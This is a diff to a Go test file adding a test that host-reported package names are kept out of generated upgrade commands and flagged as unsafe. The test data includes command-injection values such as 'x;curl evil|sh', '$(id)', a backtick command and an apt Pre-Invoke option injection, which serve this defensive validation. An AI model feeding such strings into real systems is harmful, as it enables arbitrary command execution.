@@ -2,6 +2,7 @@ package tree
 
 import (
 	"fmt"
+	"slices"
 	"strings"
 	"testing"
 
@@ -183,6 +184,44 @@ func TestDescribe(t *testing.T) {
 	vendor := Describe(tr.Nodes[3], hosts, nil, "2026-11-08")
 	if vendor.Apply != nil || vendor.Why[len(vendor.Why)-1].Code != "nofix" {
 		t.Fatalf("no fix: %+v", vendor)
+	}
+}
+
+// TestUnsafePackageNames: a package name a host reported that no package manager has stays out of the command
+// (flagged), so copying the command never runs what a host made up.
+func TestUnsafePackageNames(t *testing.T) {
+	fs, hosts := fleet()
+	evil := []string{"x;curl evil|sh", "$(id)", "-oAPT::Update::Pre-Invoke::=id", "a b", "`id`", "x\ny"}
+	for i := range fs {
+		if fs[i].Pkg == "openssl" && fs[i].Module == "os_packages" && i < 2*len(evil) {
+			fs[i].SrcPkg, fs[i].Pkg = "openssl", evil[i/2]
+		}
+	}
+	fs = append(fs, fs[0])
+	fs[len(fs)-1].Pkg, fs[len(fs)-1].Host = "libssl3+1:3.0_x~1@a", "web-01"
+	tr := Build(fs, hosts, Opts{})
+	d := &Detail{}
+	for _, n := range tr.Nodes {
+		if n.Label == "openssl" && n.Path == "" {
+			d = Describe(n, hosts, nil, "2026-11-08")
+		}
+	}
+	if len(d.Apply) != 1 {
+		t.Fatalf("apply: %+v", d.Apply)
+	}
+	a := d.Apply[0]
+	for _, e := range evil {
+		if strings.Contains(a.Command, e) || !slices.Contains(a.Unsafe, e) {
+			t.Errorf("%q: command %q, unsafe %q", e, a.Command, a.Unsafe)
+		}
+	}
+	if !strings.Contains(a.Command, "libssl3+1:3.0_x~1@a") || !strings.Contains(a.Command, "openssl") {
+		t.Error(a.Command)
+	}
+	for _, ok := range []string{"openssl", "libc6:amd64", "g++", "python3.11", "gcc-c++", "1:2.3~rc1"} {
+		if !pkgName(ok) {
+			t.Error(ok)
+		}
 	}
 }
 
